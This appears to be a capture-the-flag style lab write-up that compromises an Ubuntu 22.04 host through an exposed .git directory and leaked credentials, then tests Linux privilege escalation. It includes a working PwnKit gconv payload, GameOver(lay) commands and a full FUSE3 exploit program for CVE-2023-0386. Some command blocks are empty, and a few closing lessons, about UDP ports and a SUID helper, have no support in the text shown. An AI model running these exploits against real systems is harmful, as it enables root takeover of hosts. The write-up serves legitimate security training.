01

Reconnaissance

Three services, and a dead end closed with evidence

Goal: establish what the host actually exposes, and — just as important — write down what it doesn't, so later rabbit holes can be closed with evidence instead of vibes.

1.1 Full TCP sweep

command
mkdir -p ~/Desktop/192.168.161.144 && cd ~/Desktop/192.168.161.144
sudo nmap -Pn -p- --min-rate 3000 --max-retries 1 -T4 192.168.161.144 \
  -oN nmap_full.txt
output
Nmap scan report for 192.168.161.144
Host is up (0.069s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

65532 closed — not filtered. That matters. A reset means the host's stack is answering RFC-compliantly: there is no packet filter in front of this box, so anything that is not listed is genuinely not listening. There is no hidden service waiting on a non-standard port.

Three services, and a name for each. Time to fingerprint them.

1.2 Service versions

command
sudo nmap -Pn -sV -p21,22,80 192.168.161.144 -oN nmap_services.txt
output
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OpenSSH 8.9p1 Ubuntu 3 plus Apache 2.4.52 dates the release: Ubuntu 22.04.1 LTS. That single inference is more useful than the FTP banner, because it tells us the kernel family we will be auditing later (5.15.0-x-generic).

The FTP banner is worth a note:

command
nc -vn 192.168.161.144 21
output
220 (vsFTPd 3.0.5)

3.0.5 is the current upstream release. There is no published remote code execution for it. The only famous vsftpd bug — the USER :) smiley backdoor on port 6200 — shipped in 2.3.4 (2011) and was removed in 2.3.5. Anyone who tells you "vsftpd 3.0.5, go get the backdoor exploit" is repeating a version number without reading it.

So the FTP service is not going to be exploited. It may still be used, with credentials we do not have yet.

1.3 The dead end that has to be documented

A searchsploit ftp 3.0.5 on a box like this surfaces linux/remote/84.c — Gopherd 3.0.5 FTP Gateway Remote Overflow. It matches on the version string and nothing else.

What that exploit actually is:

  • It targets UMN gopherd, a Gopher server — not vsftpd.
  • It connects to gopher port 70 and sends ftp://x:x@<attacker>, abusing gopherd's FTP gateway.
  • It then forks a fake FTP daemon bound to the attacker's port 21, to answer gopherd's callback.
  • The overflow is in gopherd's strlen() on a LIST line; the shellcode binds port 45295.

On this host, port 70 is not open:

command
nmap -Pn -p70 --host-timeout 20s 192.168.161.144
output
PORT   STATE  SERVICE
70/tcp closed gopher

Which produces exactly this when the exploit is run:

output
[] target: 192.168.161.144:70 - localhost: 192.168.45.158 - offset: 0xbfffe29b(+0)
[] starting ftp daemon. (background)
[] attempting to connect: 192.168.161.144:70.
[!] gopher connection failed.
[!] exploit failed.

Closed, with evidence. That chapter is over — and it is worth writing down that it was closed, because "the FTP exploit didn't work" is not the same statement as "there is no gopherd here".

A note on the file itself: the copy shipped in the Kali exploitdb package is corrupted. Every * character in the C source has been stripped, so /* … */ becomes / … / and char *buf becomes char buf. It will not compile until about thirty sites are repaired. Do not read a compiler error on that file as "the exploit is broken" — the file is broken.

02

Web enumeration

Why /.git/ answers 301 — and why it is the whole box

Goal: turn "Apache serves a static page" into a list of real paths, then recognise the one path that is not a page.

2.1 Directory brute force

command
feroxbuster -u http://192.168.161.144 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,html -o ferox_161_144.txt

The interesting rows, with the noise removed:

output

200 - 709B - /.git/
200 -  21B - /.git/HEAD
200 - 306B - /.git/config
200 - 730B - /.git/index
200 - 112B - /.git/packed-refs
200 - 335B - /.git/logs/HEAD
200 - 184B - /.git/logs/refs/remotes/origin/HEAD
301 - 328B - /.git/refs/heads -> http://192.168.161.144/.git/refs/heads/
403 - 280B - /.htaccess.bak1
403 - 280B - /.htaccess.orig

Reading it: every /.htaccess* path is 403, which is a hardening rule doing its job — those files are not there. But every path under /.git/ is 200 with a plausible, non-zero body.

Two details separate a real finding from a soft-404:

  1. /.git/ itself is 200 at 709B. A directory with Options -Indexes would be 403; a real directory listing would be far larger. 709B is the size of git's default placeholder index.html — the file git init drops so the directory does not render.
  2. /.git/HEAD is 200 at 21B. Twenty-one bytes is exactly ref: refs/heads/main\n for a five-letter branch name. That is not a byte count you get from a catch-all handler.

The 301 on /.git (no trailing slash) is just Apache's directory redirect, and it confirms the directory exists.

2.2 Confirming by hand

Never build an exploit chain on a scanner's byte count. Two requests settle it:

command
curl -s http://192.168.161.144/.git/HEAD
output
ref: refs/heads/main
command
curl -s http://192.168.161.144/.git/config
output
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://<REDACTED-TOKEN>@github.com/PWK-Challenge-Lab/dev.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

That is two findings in one response.

The .git directory is being served. Apache is handing out the repository's object database, refs, index and config to anyone who asks. The entire source tree — and its full history — is downloadable. This is not a /.git/HEAD curiosity, it is a complete source disclosure.

The remote URL contains a personal access token. https://<token>@github.com/… is what you get when someone runs git clone https://ghp_xxx@github.com/org/repo. Git stores that credential in .git/config in clear text, and Apache hands it over. The token belongs to an account with access to PWK-Challenge-Lab/dev.

Both are worth recording. The token is a credential for a different system (GitHub), so it gets noted and left alone — the lab is the target, not GitHub. The repository itself is enough.

2.3 Why this is worse than a directory listing

Worth being precise about the impact, because it is routinely under-rated:

Exposed Consequence
.git/objects/** Every file that ever existed, compressed but trivially unpacked
.git/refs/**, packed-refs Every branch and tag — including deleted ones
.git/logs/HEAD The reflog: what was committed, when, by whom
.git/index The exact file list of the checked-out tree
.git/config Remote URLs, and any credential embedded in them

The critical property: git history is append-only by design. A secret that was committed and then removed in a later commit still lives in the object database, still reachable by hash, still one git show away. Deleting a file does not delete it from the repository.

That is exactly the shape of this box. We do not need a vulnerability in any application — we need to read what the developer already published, then read it again one commit earlier.

That single result decides the box. There is no SQL injection to find, because there is no search.php to inject into. api/export.php contains a genuine arbitrary-file-write (file_put_contents($_POST['location'] . $fname . $ext, …)) and it is completely unreachable. Reading that code and then hunting for the endpoint would have burned hours.

The finding is the repository. So dump the repository.

03

Dumping the repository

git-dumper, and reading history as an archive

Goal: reconstruct the full working tree and the full history from the exposed .git directory, then read the history as a source of credentials rather than as a changelog.

3.1 git-dumper

git-dumper walks the repository over HTTP: it pulls .git/HEAD, resolves the ref, downloads the index, then fetches every object reachable from the refs and checks out a working tree.

command
pip install --break-system-packages git-dumper
mkdir -p ~/lab/192.168.161.144 && cd ~/lab/192.168.161.144
git-dumper http://192.168.161.144/.git/ ./dump
output
[-] Testing http://192.168.161.144/.git/HEAD
[-] Fetching http://192.168.161.144/.git/HEAD
[-] Fetching http://192.168.161.144/.git/objects/info/packs
[-] Fetching http://192.168.161.144/.git/index

Do not use --no-checkout: the checkout is what gives you the files, and checking out a local directory of someone else's repository is harmless. What you must not do is git clone from the leaked remote URL using the leaked token.

3.6 Querying history directly

Two habits that scale better than git log | less when the repository is large:

command
## every version of every file in every commit, as pickaxe hits
git log --all -p -S'password' -- . | less

## every blob that ever existed, including from deleted branches
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(rest)' |
  awk '$1=="blob"{print $3}' | sort -u

-S (pickaxe) finds commits where the number of occurrences of a string changed — which is exactly how you find both the addition and the removal of a secret in one pass. If Security Update had been buried among two hundred commits, git log -S'BreakingBad92' would have surfaced it in one command.

Foothold

Credential reuse, and a chroot that is the whole filesystem

Goal: turn two application credentials recovered from git history into a shell on the host, using the two services already identified — and notice that the FTP account is not confined the way it looks.

4.3 What FTP can and cannot do

Writes are refused:

output
200 STOR command okay.
150 Opening BINARY mode data connection.
550 Permission denied.

anon_upload_enable is irrelevant here; write_enable=NO (or a read-only mount) is what applies to stuart. So FTP is a read-only filesystem browser — useful, but not a path to code execution. There is no upload-to-webroot route to chase, and it is worth saying so explicitly rather than spending an hour hunting for a writable directory.

The one thing worth checking anyway:

command

/ — already known. A non-writable chroot to / with these group memberships is the whole story of the FTP service.

4.4 A hardening detail that will matter

sshd_config is world-readable, and one line in it is not decoration:

command
grep -nE 'DenyUsers|AllowUsers|Match' /etc/ssh/sshd_config
output
118:#Match User anoncvs
123:DenyUsers chloe

chloe cannot log in over SSH at all. That is a deliberate obstacle, and it has two implications:

  1. Any attempt to check chloe's password over SSH is worthless — DenyUsers rejects the session before authentication, so Permission denied is returned whether the password is right or wrong. The error is about the user, not the credential.
  2. chloe must therefore be reachable another way — FTP (vsftpd does not consult DenyUsers), su from an existing session, or a local-only file.

That is a clean, deliberate piece of box design. The box is telling us that a credential for chloe exists and that SSH is not how we will use it.

05

Enumeration

Nothing in sudo, SUID or cron — the kernel is the finding

Goal: from a standard user on Ubuntu 22.04.1, find the shortest path to root — and, just as importantly, produce a written record of every candidate that was checked and ruled out, so the escalation chapter starts from evidence instead of guesswork.

5.1 The five-minute checks

command
id; uname -r; sudo -l
output
uid=1000(stuart) gid=1000(stuart) groups=1000(stuart),4(adm),24(cdrom),30(dip),46(plugdev)
5.15.0-53-generic
[sudo] password for stuart: Sorry, user stuart may not run sudo on lab-pwk2-student-cl4-144-ubuntu2204-crystal-240-111.

may not run sudo — not a password prompt loop, an outright denial. stuart has no sudo entry at all, and sudoers.d is not even listable:

command
ls -la /etc/sudoers.d/
output
ls: cannot open directory '/etc/sudoers.d/': Permission denied

Next, the classic trio: SUID binaries, file capabilities, and cron.

command
find / -perm -4000 -type f 2>/dev/null | wc -l
output
39

Thirty-nine is the stock Ubuntu 22.04 set plus snap-confine and fusermount3. Nothing hand-rolled, nothing in /opt, nothing in /home. Enumerating all 39 costs two minutes and finds nothing on this box, but it is the check that lets you stop looking there.

command
getcap -r / 2>/dev/null

Empty — no file capabilities anywhere, so there is no cap_setuid binary to abuse.

command
crontab -l; cat /etc/crontab | tail -8; ls -la /etc/cron.d /etc/cron.daily

6.1 Candidate 1 — PwnKit (CVE-2021-4034)

Everything looks right: policykit-1 0.105-33 (the GA package), pkexec setuid root, and a public exploit that needs nothing but a compiled binary and a directory name.

The bug: pkexec's main() iterates for (n = 1; n < argc; n++) and then dereferences argv[1]. When the caller passes an empty argv (argc == 0), argv[1] walks off the end of the argv vector and lands on envp[0]. pkexec then treats envp[0] as the program path — and because it is still a genuine environment variable, GCONV_PATH=. makes glibc load ./gconv-modules and ./pwnkit.so when pkexec formats its error message. The module runs as root, before authentication.

Build it:

command
cat > pwnkit.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step)
{
    setuid(0); setgid(0); setreuid(0,0); setregid(0,0);
    execl("/bin/sh", "sh", "-c",
          "/bin/cp /bin/bash /tmp/.rb161 && /bin/chmod 4755 /tmp/.rb161", NULL);
    _exit(0);
}
EOF

echo 'module UTF-8// PWNKIT// pwnkit 1' > gconv-modules
mkdir -p 'GCONV_PATH=.'
cp /usr/bin/true 'GCONV_PATH=./pwnkit.so:'
gcc --shared -fPIC -o pwnkit.so pwnkit.c
gcc -o cve-2021-4034 cve-2021-4034.c      # argv={NULL}, envp[0]="GCONV_PATH=."

Run it:

command
cd /tmp/pk161 && ./cve-2021-4034; echo "exit=$?"
output
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.

GLib: Cannot convert message is glibc saying I tried to convert and could not find the converter. Not "I refused to look". So the question becomes: is the layout wrong, or is the environment sanitised?

Two tests separate those.

Test A — does GCONV_PATH survive into pkexec at all?

command
cd /tmp/pk161
GCONV_PATH=. CHARSET=PWNKIT /usr/bin/pkexec --help
output
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”

Same message. The variable is being ignored in both cases.

Test B — is the payload correct? Run the identical gconv directory against a non-setuid copy of the same binary, where AT_SECURE is not set and nothing is stripped:

command

sed 's|/usr/bin/pkexec|/tmp/pk161/pkexec_copy|' cve-2021-4034.c > pk2.c

ls -la /tmp/.rb161
output
-rwsr-xr-x 1 stuart stuart 1396520 /tmp/.rb161

It works. Against a non-setuid binary, the module loads and the payload runs. So the GCONV_PATH=. layout, the gconv-modules name, the module path and the exported gconv_init are all correct.

That leaves exactly one explanation for the setuid case: the real pkexec is not vulnerable. Two independent reasons are visible in its output:

  • AT_SECURE strips GCONV_PATH. For a setuid binary the loader scrubs LD_*, and glibc ignores GCONV_PATH when __libc_enable_secure is set. The module can never be reached.
  • The usage text is the patched handler. The vulnerable build falls through to g_printerr(_("Error …")). The build here prints the full --version | --help | … usage block, which is what upstream's fix added for the argc < 1 case.

Recorded as refuted, with a positive control (Test B) proving the exploit was built correctly. Without Test B, "it didn't work" would have been an untested claim, and the next hour would have been spent rebuilding the wrong thing.

6.2 Candidate 2 — GameOver(lay) (CVE-2023-2640 / CVE-2023-0386's Ubuntu sibling)

The Ubuntu-specific bug: in a user namespace, setcap on a file is allowed to write a capability xattr that the kernel later honours outside the namespace. The published chain is a shell script:

command
setcap cap_setuid+eip ./python3          # inside unshare -rm
mount -t overlay overlay -o rw,lowerdir=…,upperdir=…,workdir=… ./m
touch ./m/x                              # force copy-up of the capability file
./m/python3 -c 'import os; os.setuid(0); print(os.geteuid())'

Run it here:

command
rm -rf /tmp/g; mkdir -p /tmp/g/{l,u,w,m}
cp /usr/bin/python3 /tmp/g/l/python3
unshare -rm sh -c '
  setcap cap_setuid+eip /tmp/g/l/python3 &&
  mount -t overlay overlay -o rw,lowerdir=/tmp/g/l,upperdir=/tmp/g/u,workdir=/tmp/g/w /tmp/g/m &&
  touch /tmp/g/m/python3'

Copy-up succeeds, and the capability is on the real filesystem:

output
-rwxr-xr-x 1 stuart stuart 5912936 /tmp/g/u/python3
/tmp/g/u/python3 cap_setuid=eip

So far, exactly as the exploit expects. Now execute it:

command
/tmp/g/u/python3 -c 'import os; os.setuid(0); print("euid=", os.geteuid())'
output
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted

The capability is present, the file is on ext4 (/, rw,relatime — not nosuid), and setuid is still denied. That means the kernel is not honouring the xattr. The reason is inside it:

command
python3 -c "import os; d=os.getxattr('/tmp/g/u/python3','security.capability'); \
print('rev:', int.from_bytes(d[0:4],'little'), 'rootid:', int.from_bytes(d[4:8],'little'))"
output
rev: 50331649 rootid: 128

50331649 is 0x03000001 — VFS_CAP_REVISION_3. The capability xattr has a third field, rootid, and here it is 128, a real value rather than 0.

That single value defeats the attack. Under a network-namespace setcap, a kernel without the Ubuntu patch writes revision 2 (no rootid), and the capability is honoured for real uid 0. A kernel with the fix records the namespace root's kuid in rootid, and the check at exec time refuses to grant the capability outside that namespace. rootid: 128 is the kernel saying "this capability belongs to a namespace, not to you".

Recorded as refuted, with the exact xattr as the evidence.

6.3 Candidate 3 — overlayfs copy-up (CVE-2023-0386)

The bug: when overlayfs copies a file up from the lower layer into the upper layer, it preserves the file's ownership and mode — including setuid and file capabilities — without validating that the lower layer's metadata is legitimate. A user-controlled lower layer can therefore state "this file is owned by uid 0 and is mode 04777", and the copy-up materialises that as a real root-owned SUID file in a directory the attacker owns.

Requirements:

  1. Unprivileged user namespaces — kernel.unprivileged_userns_clone = 1, max_user_namespaces = 15252. Present.
  2. The ability to mount overlayfs inside a user namespace — works, as §6.2 already demonstrated.
  3. A lower layer that can lie about st_uid and st_mode. That is exactly what FUSE is for: a userspace filesystem can report any metadata it likes for a file it serves.

The kernel here is 5.15.0-53-generic; the fix landed in 5.15.0-70. So this should work.

The problem: no FUSE2

The published PoC (xkaneiki/CVE-2023-0386) builds three things:

output

gcc            -o exp exp.c
gcc            -o gc getshell.c

fuse.c is libfuse 2. The target has:

fuse3 3.10.5-1build1

So port the helper. It only has to do four things: report a root-owned 04777 file for one path, serve its bytes, and mount.

output
/* fuse3mnt.c — minimal FUSE3 lower layer for CVE-2023-0386 */
#define FUSE_USE_VERSION 31
#define _GNU_SOURCE
#include <fuse3/fuse.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static char *content;
static size_t clen;

static int cb_getattr(const char *path, struct stat *st, struct fuse_file_info *fi)
{
    (void)fi;
    memset(st, 0, sizeof(*st));
    if (strcmp(path, "/") == 0) {
        st->st_mode = S_IFDIR | 0777;
        st->st_nlink = 2; st->st_uid = 1000; st->st_gid = 1000;
        return 0;
    }
    if (strcmp(path, "/file") == 0) {
        st->st_mode  = S_IFREG | 04777;   /* the lie: setuid root */
        st->st_nlink = 1;
        st->st_uid   = 0;
        st->st_gid   = 0;
        st->st_size  = (off_t)clen;
        return 0;
    }
    return -ENOENT;
}

static int cb_readdir(const char *p, void *buf, fuse_fill_dir_t filler,
                      off_t o, struct fuse_file_info *fi, enum fuse_readdir_flags f)
{
    (void)p; (void)o; (void)fi; (void)f;
    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);
    filler(buf, "file", NULL, 0, 0);
    return 0;
}

static int cb_open(const char *path, struct fuse_file_info *fi)
{ (void)fi; return strcmp(path, "/file") ? -ENOENT : 0; }

static int cb_read(const char *path, char *buf, size_t size, off_t off,
                   struct fuse_file_info *fi)
{
    (void)fi;
    if (strcmp(path, "/file")) return -ENOENT;
    if ((size_t)off >= clen) return 0;
    if ((size_t)off + size > clen) size = clen - (size_t)off;
    memcpy(buf, content + off, size);
    return (int)size;
}

static struct fuse_operations ops = {
    .getattr = cb_getattr, .readdir = cb_readdir,
    .open    = cb_open,    .read    = cb_read,
};

int main(int argc, char **argv)
{
    char *fargv[2] = { (char *)"fuse3mnt", NULL };
    struct fuse_args args = FUSE_ARGS_INIT(1, fargv);
    struct fuse *f;
    int fd;

    if (argc < 3) { fprintf(stderr, "usage: %s <mnt> <file>\n", argv[0]); return 1; }

    fd = open(argv[2], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    content = malloc(1 << 20);
    clen = 0;
    while (read(fd, content + clen, 1) > 0 && clen < (1 << 20)) clen++;
    close(fd);

    f = fuse_new(&args, &ops, sizeof(ops), NULL);
    if (!f) { fprintf(stderr, "fuse_new failed\n"); return 1; }
    if (fuse_mount(f, argv[1]) != 0) { fprintf(stderr, "fuse_mount failed\n"); return 1; }
    fuse_loop(f);
    return 0;
}

fuse_new needs a non-empty argv — FUSE_ARGS_INIT(0, NULL) fails with fuse: empty argv passed to fuse_session_new(), which is worth knowing because every FUSE3 low-level example online passes &argc, &argv from main and never mentions it.

The pkill -x deserves a warning. Use -x (exact process name). pkill -f fuse3mnt matches the command line, and the cleanup SSH command itself contains the string fuse3mnt — so pkill -f kills the shell running the cleanup, halfway through, and the session dies with no output. That happened once here and produced a confusing empty result before the cause was obvious.

A leftover FUSE mount is worth hunting rather than ignoring: if fuse3mnt is killed without unmounting, /tmp/ovl/ovlcap/lower is a stale mountpoint, and anything that traverses /tmp can block on it. fusermount3 -uz (lazy unmount) is the fix.

7.4 What this box actually teaches

1. .git is a backup, not a directory. The web root contained no application at all — every PHP file returned 404. The repository inside /.git/ contained the whole history, and the history contained the passwords. Treat a served .git as a full source disclosure, and treat git log as an archive of every secret that has ever been committed.

2. "Fixed" and "removed" are different verbs. Security Update blanked the credentials and even left a comment explaining why. It did not rewrite history, so the secret remained in the object database. When a secret has been committed, the only real remediation is revoke the credential and rewrite history — in that order.

3. A username can be a decoy. stuart@challenge.lab is not a UNIX account; stuart is. The @challenge.lab suffix cost one attempt and taught nothing. Strip the domain, try the local part.

4. DenyUsers is not a credential check. chloe is in sudo and DenyUsers chloe blocks SSH before authentication — so a Permission denied against her says nothing about her password. Any test of her credential has to go through a different service. Here the same test over FTP answered 530, which is a real answer.

5. A version string is a hypothesis. policykit-1 0.105-33 and kernel 5.15.0-53 both say "vulnerable" and both were wrong for two of the three candidates. The method that resolved it was a positive control: run the identical payload against a non-setuid pkexec, where it worked. That one test converted "PwnKit doesn't work here" into "PwnKit is patched here" — a defensible conclusion instead of a shrug.

6. Read the xattr and believe it. GameOver(lay) failed with EPERM while getcap happily reported cap_setuid=eip. The resolution was not in getcap but in the raw xattr: revision 3, rootid=128. 0x03000001 versus 0x02000001 is the entire difference between an exploitable capability and a namespaced one.

7. Porting a PoC is normal work. The overlayfs exploit assumed libfuse 2; the target shipped only FUSE3 and had no compiler. Writing a 90-line FUSE3 adapter and cross-building it statically was faster than hunting a different exploit — and it is the kind of adaptation that a real engagement demands. Two build gotchas worth remembering: FUSE_ARGS_INIT(0, NULL) is rejected by fuse_new, and Kali's glibc 2.38 does not run on Ubuntu 22.04's glibc 2.35, so build -static.

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command

For each service, in the order that historically pays fastest.

  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.
